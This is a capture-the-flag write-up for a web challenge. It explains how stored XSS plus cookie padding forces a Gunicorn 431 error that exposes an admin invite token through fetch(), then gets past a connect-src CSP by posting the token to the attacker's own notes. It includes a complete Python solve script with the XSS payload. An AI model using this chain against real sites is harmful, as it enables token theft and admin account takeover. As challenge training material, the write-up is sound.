# Just Another Notes App (Web Exploitation)

## Challenge Description

> You know what to do. Good luck!

**Author:** mrrobot404  
**URL:** `https://notes.chals.nitectf25.live/`

## TL;DR

Exploit **Gunicorn's 8187-byte header size limit** to force a `431 Request Header Fields Too Large` error. When cookies are padded to just under the limit, a redirect response to `/getToken?token=ADMIN_TOKEN` causes the total headers to exceed the limit — and the `431` status code causes `fetch()` to expose the `Location` URL (including the token) to JavaScript. CSP `connect-src: 'self'` blocks direct exfiltration, so the bot is made to post the token as a note in the attacker's account instead.

## Background

This challenge is based on the technique described in [this article](https://castilho.sh/scream-until-escalates):

> When a `fetch()` request results in a `431` error, the browser exposes the final redirected URL to JavaScript even though it normally hides `Location` headers on cross-origin redirects.

This is because the `431` happens _after_ the redirect is followed (when Gunicorn rejects the inflated cookie headers on the redirected request), and at that point, `fetch()` can read `response.url` which contains the redirect destination — the full URL with the token in the query string.

## Architecture

- Notes app with user registration, login, note creation
- Admin bot that visits submitted URLs
- `/admin/generate_invite` — generates a one-time invite token
- `/getToken` — redirects to `/auth/callback?token=FINAL_TOKEN`
- `/invite?token=TOKEN` — promotes a user to admin
- Flag is in an `httpOnly` cookie set on admin access (unreachable via XSS directly)

**CSP:** `connect-src: 'self'` — no direct exfiltration to external URLs.

## Solution

### Step 1: Understand the Token Flow

```
POST /admin/generate_invite  →  creates invite token
GET  /getToken               →  redirects to /auth/callback?token=FINAL_TOKEN
```

The token in the redirect URL is what we need. Normally `fetch()` hides redirect `Location` headers, but a `431` error after following the redirect exposes `response.url`.

### Step 2: The Cookie Padding Trick

Gunicorn's header limit is **8187 bytes**. The exploit:

1. Set cookies `x` and `y` padded to just under 8187 bytes
2. When the bot fetches `/getToken`, Gunicorn redirects to `/auth/callback?token=TOKEN`
3. On the redirect, cookies are sent again — now the total headers (original + redirect URL with token) exceed 8187
4. Gunicorn responds `431` — and `fetch()` exposes the full redirect URL including `?token=TOKEN`

Cookie padding values from the solve script:

```js
document.cookie = "x=" + "A".repeat(4095);
document.cookie = "y=" + "B".repeat(3991);
// Total padding ≈ 8086 bytes — just below limit
// After redirect adds token to URL, total exceeds 8187
```

### Step 3: CSP Bypass via Self-Post

`connect-src: 'self'` blocks `fetch()` to attacker-controlled URLs. Instead, the XSS payload makes the admin bot post the extracted token as a note **using the attacker's session cookie**:

```js
// Swap attacker session in, post token as note, swap back
document.cookie = "session=ATTACKER_SESSION";
await fetch("/notes", {
  method: "POST",
  headers: { "Content-Type": "application/x-www-form-urlencoded" },
  body: "content=" + encodeURIComponent(token),
});
```

The attacker then reads the token from their own notes page.

### Step 4: Use Token to Become Admin

```bash
curl "https://notes.chals.nitectf25.live/invite?token=LEAKED_TOKEN"
# → promotes attacker's account to admin
# → flag cookie set (read via /admin page)
```

### Full XSS Payload

```python
import requests
from bs4 import BeautifulSoup

s = requests.Session()

# Register and login
s.post("https://notes.chals.nitectf25.live/register",
       data={"username": "attacker", "password": "pass"})
s.post("https://notes.chals.nitectf25.live/login",
       data={"username": "attacker", "password": "pass"})

session_cookie = s.cookies.get("session")

xss_payload = f"""<script>
(async () => {{
    // Generate admin invite token
    await fetch("/admin/generate_invite", {{ method: "POST" }});

    // Pad cookies to just below Gunicorn's 8187-byte limit
    document.cookie = "x=" + "A".repeat(4095);
    document.cookie = "y=" + "B".repeat(3991);

    // Fetch /getToken — redirect to /auth/callback?token=TOKEN
    // Padded cookies push total headers over 8187 → 431 error
    // fetch() exposes response.url = full redirect URL including token
    const e = await fetch("/getToken", {{ credentials: "include" }});
    const url = new URL(e.url);
    const token = url.searchParams.get("token");

    // Clear padding, restore attacker session
    document.cookie = "x=A";
    document.cookie = "y=B";
    document.cookie = "session={session_cookie}";

    // Post token as a note in attacker's account (CSP: connect-src 'self')
    await fetch("/notes", {{
        method: "POST",
        headers: {{ "Content-Type": "application/x-www-form-urlencoded" }},
        body: "content=" + encodeURIComponent(token)
    }});
}})();
</script>"""

# Post the XSS note and get its URL
r = s.post("https://notes.chals.nitectf25.live/notes",
           data={"content": xss_payload})

r = s.get("https://notes.chals.nitectf25.live/notes")
soup = BeautifulSoup(r.text, 'html.parser')
note_link = soup.find('div').find('a')['href']

print(f"[*] Submit this URL to the admin bot: {note_link}")
print("[*] Then check your notes for the token, use it at /invite?token=TOKEN")
```

## Flag

```
nite{r3qu3575_d0n7_n33d_70_4lw4y5_c0mpl373}
```

## Key Takeaways

- **431 status code as an oracle** — browser `fetch()` exposes `response.url` after a `431`, leaking redirect destinations that would otherwise be hidden under `strict-origin-when-cross-origin` referrer policy
- **Cookie padding as a trigger** — precisely inflating cookie size to force a server's header limit on a specific redirected request is a targeted denial-of-service that doubles as a data leak
- **CSP `connect-src: 'self'` bypass** — when you can't exfiltrate directly, use the victim's browser to write data somewhere you can read it (posting to a note, creating a bookmark, modifying shared state)
- **httpOnly ≠ safe from all XSS** — even if the flag cookie is httpOnly, XSS can still promote the attacker's account to admin by obtaining tokens through side channels
- **Defense:** Use server-side sessions instead of URL tokens; set aggressive cookie size limits; implement CSRF protection; audit all redirect flows for token exposure

## Tools Used

- Python `requests` + `BeautifulSoup` — registration, login, note posting, response parsing
- Browser DevTools — manually verifying `431` behavior and cookie sizes
- `fetch()` API — exploit delivery mechanism within the XSS payload
